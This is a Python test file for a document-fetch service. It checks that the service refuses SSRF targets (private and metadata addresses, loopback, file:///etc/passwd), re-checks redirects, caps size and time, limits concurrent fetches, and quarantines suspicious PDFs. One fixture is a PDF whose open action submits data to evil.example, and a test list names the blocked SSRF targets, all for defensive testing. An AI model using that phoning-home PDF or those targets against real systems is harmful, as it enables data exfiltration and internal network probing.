"""Documents fetched by the control plane for runs in workspaces (fetchsvc.py).

The network is faked at the two places the service touches it: name
resolution, and the connection made to the address that was checked.
"""

from __future__ import annotations

import socket

import pytest

from app import fetchsvc

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)

ADDRESSES = {
    "vendor.example": ["93.184.216.34"],
    "mirror.example": ["93.184.216.35"],
    "inside.example": ["10.0.0.7"],
    "metadata.example": ["169.254.169.254"],
    "mixed.example": ["93.184.216.36", "127.0.0.1"],
}
# host -> (status, headers, body)
SITES: dict[str, tuple[int, dict, bytes]] = {}


def resolve(host, port):
    if host not in ADDRESSES:
        raise socket.gaierror("unknown")
    return ADDRESSES[host]


class FakeConn:
    connected: list[tuple[str, str]] = []

    def __init__(self, host, port, address, timeout=None):
        self.host, self.address = host, address

    def request(self, method, path, headers=None):
        FakeConn.connected.append((self.host, self.address))

    def getresponse(self):
        status, headers, body = SITES[self.host]

        class R:
            def __init__(self):
                self.status = status
                self.at = 0

            def getheader(self, name, default=None):
                return headers.get(name, default)

            def read(self, n=-1):
                end = len(body) if n < 0 else self.at + n
                out, self.at = body[self.at:end], min(end, len(body))
                return out

        return R()

    def close(self):
        pass


CONN = {"https": FakeConn, "http": FakeConn}


@pytest.fixture(autouse=True)
def _reset(monkeypatch):
    SITES.clear()
    FakeConn.connected.clear()
    for name in ("BLPL_CLAMD_SOCKET", "BLPL_CLAMD_HOST", "BLPL_QUARANTINE_REQUIRE_SCAN"):
        monkeypatch.delenv(name, raising=False)


def _download(url):
    return fetchsvc.download(url, resolve=resolve, connections=CONN)


def test_a_public_pdf_is_fetched_from_the_address_that_was_checked():
    SITES["vendor.example"] = (200, {}, BENIGN)
    got = _download("https://vendor.example/ds.pdf")
    assert got.data == BENIGN
    assert FakeConn.connected == [("vendor.example", "93.184.216.34")]


@pytest.mark.parametrize("url", [
    "https://inside.example/x.pdf", "https://metadata.example/latest",
    "https://mixed.example/x.pdf", "https://127.0.0.1/x.pdf", "http://[::1]/x.pdf",
    "ftp://vendor.example/x.pdf", "https://vendor.example:8443/x.pdf", "file:///etc/passwd",
])
def test_private_and_odd_targets_are_refused(url):
    ADDRESSES["127.0.0.1"] = ["127.0.0.1"]
    ADDRESSES["::1"] = ["::1"]
    with pytest.raises(fetchsvc.Refused):
        _download(url)
    assert FakeConn.connected == []


def test_a_redirect_to_a_private_address_is_refused():
    SITES["vendor.example"] = (302, {"Location": "https://inside.example/x.pdf"}, b"")
    with pytest.raises(fetchsvc.Refused, match="private or local"):
        _download("https://vendor.example/ds.pdf")
    assert FakeConn.connected == [("vendor.example", "93.184.216.34")]


def test_a_redirect_to_another_public_host_is_followed_and_checked():
    SITES["vendor.example"] = (301, {"Location": "https://mirror.example/ds.pdf"}, b"")
    SITES["mirror.example"] = (200, {}, BENIGN)
    assert _download("https://vendor.example/ds.pdf").url == "https://mirror.example/ds.pdf"


def test_the_size_is_capped():
    SITES["vendor.example"] = (200, {"Content-Length": str(10**9)}, BENIGN)
    with pytest.raises(fetchsvc.Refused, match="larger than"):
        _download("https://vendor.example/ds.pdf")
    SITES["vendor.example"] = (200, {}, b"%PDF-" + b"x" * 100)
    with pytest.raises(fetchsvc.Refused, match="larger than"):
        fetchsvc.download("https://vendor.example/ds.pdf", resolve=resolve,
                          connections=CONN, max_bytes=50)


def test_what_quarantine_holds_stays_with_the_control_plane(tmp_path):
    held = tmp_path / "held"
    status, verdict, body = fetchsvc.assess(
        "board", fetchsvc.Download("https://vendor.example/x.pdf", PHONES_HOME), held)
    assert status == 422 and verdict["held"] and body == b""
    assert any("opened" in r for r in verdict["reasons"])
    assert (held / "board" / f"{verdict['sha256']}.pdf").read_bytes() == PHONES_HOME
    status, verdict, body = fetchsvc.assess(
        "board", fetchsvc.Download("https://vendor.example/x", b"<html>login</html>"), held)
    assert status == 422 and "not a PDF" in verdict["reasons"][0]
    status, verdict, body = fetchsvc.assess(
        "board", fetchsvc.Download("https://vendor.example/x.pdf", BENIGN), held)
    assert status == 200 and body == BENIGN


def test_a_workspace_runs_fetch_lands_in_quarantine_through_the_control_plane(tmp_path):
    """End to end, over HTTP: the run's ServiceFetcher, this service with its
    credential check, and the project's own quarantine. The accepted file is
    released; the held one never reaches the project."""
    from blpl.core import fetcher, quarantine

    SITES["vendor.example"] = (200, {}, BENIGN)
    SITES["mirror.example"] = (200, {}, PHONES_HOME)

    def authenticate(user, password):
        return "board" if (user, password) == ("g-run", "tok") else None

    server = fetchsvc.serve("127.0.0.1:0", tmp_path / "held", authenticate=authenticate,
                            resolve=resolve, connections=CONN)
    try:
        service = f"http://127.0.0.1:{server.server_port}"
        f = fetcher.get_fetcher({"BLPL_FETCH_SERVICE": service, "BLPL_FETCH_AUTH": "g-run:tok"})
        proj = tmp_path / "board"
        rec = fetcher.retrieve_into(f, "https://vendor.example/ds.pdf", proj, mpn="TPS62840",
                                    distributor="mouser", as_name="TPS62840.pdf")
        assert rec["state"] == quarantine.RELEASED
        assert (proj / "datasheets" / "TPS62840.pdf").read_bytes() == BENIGN
        rec = fetcher.retrieve_into(f, "https://mirror.example/evil.pdf", proj, mpn="EVIL")
        assert rec["state"] == quarantine.HELD
        assert not any(PHONES_HOME in p.read_bytes() for p in proj.rglob("*") if p.is_file())
        assert (tmp_path / "held" / "board").is_dir()

        # Somebody else's credential, or none, gets nothing.
        bad = fetcher.get_fetcher({"BLPL_FETCH_SERVICE": service, "BLPL_FETCH_AUTH": "g-x:no"})
        assert bad.get("https://vendor.example/ds.pdf").error
        # A private target is refused by the service, not fetched.
        refused = f.get("https://inside.example/x.pdf")
        assert refused.data is None and "private" in refused.error
    finally:
        server.shutdown()
        server.server_close()


def test_only_a_run_grant_for_its_project_authenticates(client):
    """db_authenticate: a run's grant names its project; a git grant does not
    fetch documents."""
    from app import egress
    from app.db import SessionFactory

    with SessionFactory() as s:
        run, run_tok = egress.issue(s, kind="run", project="board")
        git, git_tok = egress.issue(s, kind="git", project="board")
        s.commit()
    assert fetchsvc.db_authenticate(run, run_tok) == "board"
    assert fetchsvc.db_authenticate(run, "wrong") is None
    assert fetchsvc.db_authenticate(git, git_tok) is None


def test_a_workspace_reaches_the_fetch_service_directly_not_through_squid():
    from app.sandbox import jobs

    env = jobs.workspace_env({"BLPL_SANDBOX_HTTP_PROXY": "http://squid:3128",
                              "BLPL_FETCH_SERVICE_URL": "http://blpl-fetch:8001"})
    assert "blpl-fetch" in env["NO_PROXY"].split(",")


# -- a server that trickles, and too many at once (Codex, PR #20) ---------------------------


def test_a_server_that_trickles_is_cut_off_at_the_deadline():
    """One byte per read keeps every socket timeout happy; only the total
    deadline stops it."""
    import time

    class Trickle(FakeConn):
        def getresponse(self):
            class R:
                status = 200

                def getheader(self, name, default=None):
                    return default

                def read(self, n=-1):
                    time.sleep(0.05)
                    return b"%"

            return R()

    t0 = time.monotonic()
    with pytest.raises(fetchsvc.Refused, match="longer than"):
        fetchsvc.download("https://vendor.example/ds.pdf", resolve=resolve,
                          connections={"https": Trickle}, deadline_s=1.0)
    assert time.monotonic() - t0 < 3


def test_the_size_cap_is_enforced_while_streaming():
    class Endless(FakeConn):
        def getresponse(self):
            class R:
                status = 200

                def getheader(self, name, default=None):
                    return default

                def read(self, n=-1):
                    return b"x" * 65536

            return R()

    with pytest.raises(fetchsvc.Refused, match="larger than"):
        fetchsvc.download("https://vendor.example/ds.pdf", resolve=resolve,
                          connections={"https": Endless}, max_bytes=1024 * 1024)


def test_fetches_beyond_the_limits_are_refused_not_queued():
    s = fetchsvc.Slots(total=3, per_run=2)
    assert s.take("a") and s.take("a")
    assert not s.take("a"), "a third for one run"
    assert s.take("b")
    assert not s.take("c"), "a fourth in all"
    s.give("a")
    assert s.take("c")


def test_the_service_answers_429_beyond_its_limit(tmp_path):
    import base64
    import json
    import threading
    import urllib.error
    import urllib.request

    release = threading.Event()

    class Held(FakeConn):
        def getresponse(self):
            release.wait(10)
            return super().getresponse()

    SITES["vendor.example"] = (200, {}, BENIGN)
    server = fetchsvc.serve("127.0.0.1:0", tmp_path / "held", authenticate=lambda u, p: "board",
                            resolve=resolve, connections={"https": Held},
                            slots=fetchsvc.Slots(total=8, per_run=1))

    def post():
        req = urllib.request.Request(
            f"http://127.0.0.1:{server.server_port}/fetch", method="POST",
            data=json.dumps({"url": "https://vendor.example/ds.pdf"}).encode(),
            headers={"Authorization": "Basic " + base64.b64encode(b"g-run:t").decode(),
                     "Content-Type": "application/json"})
        try:
            with urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req) as r:
                return r.status
        except urllib.error.HTTPError as exc:
            return exc.code

    try:
        first = []
        t = threading.Thread(target=lambda: first.append(post()))
        t.start()
        import time
        time.sleep(0.3)
        assert post() == 429  # the same run's second, while its first is held
        release.set()
        t.join(10)
        assert first == [200]
    finally:
        release.set()
        server.shutdown()
        server.server_close()



def test_a_slot_is_held_through_assessment_not_only_the_download(tmp_path, monkeypatch):
    """Codex, PR #20: the slot was given back when the download finished, so
    a run could keep assessments (PDF parsing, a scan that can wait 30 s)
    going without bound. Two of one run's fetches are being assessed; its
    third is refused."""
    import base64
    import json
    import threading
    import time
    import urllib.error
    import urllib.request

    release = threading.Event()
    assessing = []
    real = fetchsvc.assess

    def slow_assess(project, got, held_root):
        assessing.append(1)
        release.wait(10)
        return real(project, got, held_root)

    monkeypatch.setattr(fetchsvc, "assess", slow_assess)
    SITES["vendor.example"] = (200, {}, BENIGN)
    server = fetchsvc.serve("127.0.0.1:0", tmp_path / "held", authenticate=lambda u, p: "board",
                            resolve=resolve, connections=CONN,
                            slots=fetchsvc.Slots(total=8, per_run=2))

    def post():
        req = urllib.request.Request(
            f"http://127.0.0.1:{server.server_port}/fetch", method="POST",
            data=json.dumps({"url": "https://vendor.example/ds.pdf"}).encode(),
            headers={"Authorization": "Basic " + base64.b64encode(b"g-run:t").decode(),
                     "Content-Type": "application/json"})
        try:
            with urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req) as r:
                return r.status
        except urllib.error.HTTPError as exc:
            return exc.code

    try:
        done: list[int] = []
        threads = [threading.Thread(target=lambda: done.append(post())) for _ in range(2)]
        for t in threads:
            t.start()
        deadline = time.monotonic() + 5
        while len(assessing) < 2 and time.monotonic() < deadline:
            time.sleep(0.05)
        assert len(assessing) == 2, "both fetches should be in assessment"
        assert post() == 429
        release.set()
        for t in threads:
            t.join(10)
        assert done == [200, 200]
        assert post() == 200  # slots come back once assessment is done
    finally:
        release.set()
        server.shutdown()
        server.server_close()


def test_held_evidence_is_bounded_per_project(tmp_path, monkeypatch):
    monkeypatch.setattr(fetchsvc, "HELD_MAX_BYTES", len(PHONES_HOME) + 10)
    held = tmp_path / "held"
    s1, v1, _ = fetchsvc.assess("board", fetchsvc.Download("u", PHONES_HOME), held)
    s2, v2, _ = fetchsvc.assess("board", fetchsvc.Download("u", PHONES_HOME + b"%x\n"), held)
    assert s1 == s2 == 422 and v1["held"] and v2["held"]
    assert len(list((held / "board").glob("*.pdf"))) == 1  # the second was held, not kept
